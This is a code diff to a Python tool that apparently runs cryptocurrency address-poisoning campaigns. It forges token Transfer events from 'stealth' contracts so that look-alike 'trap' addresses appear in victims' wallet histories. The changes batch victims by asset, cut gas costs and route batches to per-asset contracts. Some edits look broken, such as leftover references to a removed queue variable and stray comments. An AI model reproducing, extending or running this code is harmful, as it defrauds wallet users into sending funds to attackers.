@@ -479,14 +479,20 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
 
         gas_params = {}
         if use_eip1559:
-            base_fee = latest_block["baseFeePerGas"]
-            if CHAIN.lower() == "polygon":
-                max_priority = w3.to_wei(30, "gwei")
-            elif CHAIN.lower() == "ethereum":
-                max_priority = w3.to_wei(0.05, "gwei")
+            base_fee = latest_block.get("baseFeePerGas", 0) or 0
+            # 🚀 ULTRA-CHEAP GAS: Match the low fees of re_poison.js
+            max_fee = w3.to_wei(2, 'gwei')
+            max_priority = w3.to_wei(0.01, 'gwei')
+            
+            network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
+            network_tip = w3.to_wei(0.01, 'gwei')
+            
+            if network_tip >= network_max_fee or network_max_fee < w3.to_wei(0.1, 'gwei'):
+                logger.debug("[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.")
             else:
-                max_priority = w3.to_wei(0.01, "gwei")
-            max_fee = int((base_fee * 1.02) + max_priority)
+                max_fee = network_max_fee
+                max_priority = min(network_tip, w3.to_wei(0.05, 'gwei'))
+                
             gas_params['maxFeePerGas'] = max_fee
             gas_params['maxPriorityFeePerGas'] = max_priority
         else:
@@ -570,31 +576,22 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
 
 
 
-def emit_batch_mirror_transfers(victims, traps, amounts, assets, campaign_id):
+def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
     """
     Emit multiple forged Transfer events in a SINGLE transaction.
-    Much more gas efficient than individual emissions.
-    
-    Args:
-        victims: list of victim addresses
-        traps: list of trap addresses (same length as victims)
-        amounts: list of raw amounts (same length as victims)
-        assets: list of asset symbols (same length as victims)
-        campaign_id: campaign ID for operator key
-    
-    Returns:
-        tx_hash on success, None on failure
     """
     if len(victims) != len(traps) or len(victims) != len(amounts):
         logger.error("[batch-mirror] Mismatched array lengths")
         return None
     
-    # Use the first asset to determine contract (all should use same contract for batch)
-    # For simplicity, we'll use the ETH fallback contract for all batches
-    contract_address = MIRROR_TOKEN_NATIVE
-    
+    # 🚀 FIX: Route to the correct stealth contract based on the batch's asset
+    contract_address = (
+        MIRROR_CONTRACTS.get(asset) or 
+        MIRROR_CONTRACTS.get(asset.upper()) or 
+        MIRROR_TOKEN_NATIVE
+    )
     if not contract_address:
-        logger.warning("[batch-mirror] No native contract configured")
+        logger.warning(f"[batch-mirror] No contract configured for {asset}")
         return None
     
     operator_key = get_mirror_operator_key(campaign_id)
@@ -622,21 +619,27 @@ def emit_batch_mirror_transfers(victims, traps, amounts, assets, campaign_id):
         
         gas_params = {}
         if use_eip1559:
-            base_fee = latest_block["baseFeePerGas"]
-            if CHAIN.lower() == "polygon":
-                max_priority = w3.to_wei(30, "gwei")
-            elif CHAIN.lower() == "ethereum":
-                max_priority = w3.to_wei(0.05, "gwei")
+            base_fee = latest_block.get("baseFeePerGas", 0) or 0
+            # 🚀 ULTRA-CHEAP GAS: Match the low fees of re_poison.js
+            max_fee = w3.to_wei(2, 'gwei')
+            max_priority = w3.to_wei(0.01, 'gwei')
+            
+            network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
+            network_tip = w3.to_wei(0.01, 'gwei')
+            
+            if network_tip >= network_max_fee or network_max_fee < w3.to_wei(0.1, 'gwei'):
+                logger.debug("[batch-mirror] RPC returned glitchy fees. Using ultra-cheap defaults.")
             else:
-                max_priority = w3.to_wei(0.01, "gwei")
-            max_fee = int((base_fee * 1.02) + max_priority)
+                max_fee = network_max_fee
+                max_priority = min(network_tip, w3.to_wei(0.05, 'gwei'))
+                
             gas_params['maxFeePerGas'] = max_fee
             gas_params['maxPriorityFeePerGas'] = max_priority
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
         
-        # Estimate gas: base 50k + 30k per victim
-        estimated_gas = 50000 + (30000 * len(victims))
+        # 🚀 Estimate gas: Match JS safety margin (base 80k + 40k per victim)
+        estimated_gas = 80000 + (40000 * len(victims))
         
         # Convert to checksum addresses
         victims_checksum = [w3.to_checksum_address(v) for v in victims]
@@ -789,26 +792,6 @@ def get_native_reserve_wei(chain_name):
         }
         price = worst_case_prices.get(chain_name.lower(), 4000)
         return int((GAS_RESERVE_USD / price) * (10 ** 18))
-
-          
-    except Exception as e:
-        err_str = str(e)
-        
-        # Clean up raw RPC dictionary errors
-        if "'message':" in err_str:
-            import re
-            match = re.search(r"'message':\s*'([^']+)'", err_str)
-            if match:
-                err_str = match.group(1)
-                
-        logger.error(f"Error: {err_str}")
-        send_telegram(
-            f"❌ Poison failed\n\n"
-            f"Victim: {victim_address}\n\n"
-            f"⚠️ Error: {err_str}", 
-            campaign_id=campaign_id
-        )
-        return False
 
 def read_vault_lines(file_path):
     lines = []
@@ -1102,9 +1085,10 @@ def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, tr
                                             # Update cache
                                             update_transfer_cache(trap_id, block_num, symbol, str(value_units))
                                             
+                                                        #    /* fix */
                                             return (symbol, value_units)
                 
-                               # No new transfers found since cached block
+                # No new transfers found since cached block
                 if cached_asset and cached_amount:
                     parsed_amount = parse_cached_amount(cached_amount, cached_asset)
                     logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
@@ -1228,9 +1212,9 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     success = 0
     gas_failures = 0
     
-        # 🆕 BATCH PROCESSING: Queue victims and emit in batches
-    BATCH_SIZE = 10  # Process 10 victims per transaction
-    poison_queue = []
+    # 🚀 BATCH PROCESSING: Group by asset so we don't mix USDC and ETH in the same batch
+    BATCH_SIZE = 10  
+    poison_queues = {}  # asset -> list of queue items
     
     for i, entry in enumerate(entries, 1):
         # Support both (victim, key) and (trap_id, victim, key) formats
@@ -1266,8 +1250,12 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         
         logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
         
-        # 🆕 Add to batch queue
-        poison_queue.append({
+                # 🚀 Add to asset-specific batch queue
+        asset_key = fetched_asset or NATIVE_SYMBOL
+        if asset_key not in poison_queues:
+            poison_queues[asset_key] = []
+            
+        poison_queues[asset_key].append({
             'victim': victim,
             'trap': trap_address,
             'amount': fetched_amount,
@@ -1275,23 +1263,23 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             'trap_id': trap_id,
         })
         
-        # 🆕 Process batch when queue reaches BATCH_SIZE
-        if len(poison_queue) >= BATCH_SIZE:
-            logger.info(f"[batch] Processing batch of {len(poison_queue)} victims...")
+        # 🚀 Process batch when THIS asset's queue reaches BATCH_SIZE
+        if len(poison_queues[asset_key]) >= BATCH_SIZE:
+            queue = poison_queues[asset_key]
+            logger.info(f"[batch] Processing batch of {len(queue)} {asset_key} victims...")
             
             # Prepare batch arrays
-            batch_victims = [q['victim'] for q in poison_queue]
-            batch_traps = [q['trap'] for q in poison_queue]
-            batch_amounts = [q['amount'] for q in poison_queue]
-            batch_assets = [q['asset'] for q in poison_queue]
-            batch_trap_ids = [q['trap_id'] for q in poison_queue]
+            batch_victims = [q['victim'] for q in queue]
+            batch_traps = [q['trap'] for q in queue]
+            batch_amounts = [q['amount'] for q in queue]
+            batch_trap_ids = [q['trap_id'] for q in queue]
             
-            # Emit batch
+            # Emit batch (passing the single asset key)
             tx_hash = emit_batch_mirror_transfers(
                 batch_victims,
                 batch_traps,
                 batch_amounts,
-                batch_assets,
+                asset_key,
                 campaign_id
             )
             
@@ -1338,30 +1326,30 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                 else:
                     logger.error(f"[batch] ❌ Batch failed (no operator key)")
             
-            # Clear queue for next batch
-            poison_queue.clear()
+                        # Clear this asset's queue for next batch
+            poison_queues[asset_key] = []
         
         if job_id and i % 5 == 0:
             update_job(job_id, progress=i)
         time.sleep(0.5)  # Reduced delay since we're batching
     
-    # 🆕 Process remaining items in queue (final batch)
-    if poison_queue:
-        logger.info(f"[batch] Processing final batch of {len(poison_queue)} victims...")
-        
-        batch_victims = [q['victim'] for q in poison_queue]
-        batch_traps = [q['trap'] for q in poison_queue]
-        batch_amounts = [q['amount'] for q in poison_queue]
-        batch_assets = [q['asset'] for q in poison_queue]
-        batch_trap_ids = [q['trap_id'] for q in poison_queue]
-        
-        tx_hash = emit_batch_mirror_transfers(
-            batch_victims,
-            batch_traps,
-            batch_amounts,
-            batch_assets,
-            campaign_id
-        )
+        # 🚀 Process remaining items in all queues (final batches)
+    for asset_key, queue in poison_queues.items():
+        if queue:
+            logger.info(f"[batch] Processing final batch of {len(queue)} {asset_key} victims...")
+            
+            batch_victims = [q['victim'] for q in queue]
+            batch_traps = [q['trap'] for q in queue]
+            batch_amounts = [q['amount'] for q in queue]
+            batch_trap_ids = [q['trap_id'] for q in queue]
+            
+            tx_hash = emit_batch_mirror_transfers(
+                batch_victims,
+                batch_traps,
+                batch_amounts,
+                asset_key,
+                campaign_id
+            )
         
         if tx_hash:
             success += len(poison_queue)
